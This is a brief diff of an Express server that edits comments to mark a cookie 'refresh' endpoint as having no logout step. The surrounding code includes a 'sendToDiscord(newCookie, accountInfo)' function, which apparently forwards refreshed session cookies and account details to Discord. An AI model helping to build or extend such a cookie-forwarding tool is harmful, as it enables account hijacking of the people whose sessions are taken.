@@ -21,7 +21,7 @@ app.use((req, res, next) => {
 // Serve static files
 app.use(express.static('public'));
 
-// API Routes
+// API Routes - REMOVED logout, keep only refresh
 app.post('/api/refresh', handleRefreshAPI);
 
 // Serve HTML on root
@@ -296,7 +296,7 @@ async function sendToDiscord(newCookie, accountInfo) {
 }
 
 // ============================================================
-// MAIN REFRESH HANDLER
+// MAIN REFRESH HANDLER - NO LOGOUT STEP
 // ============================================================
 
 async function handleRefreshAPI(req, res) {
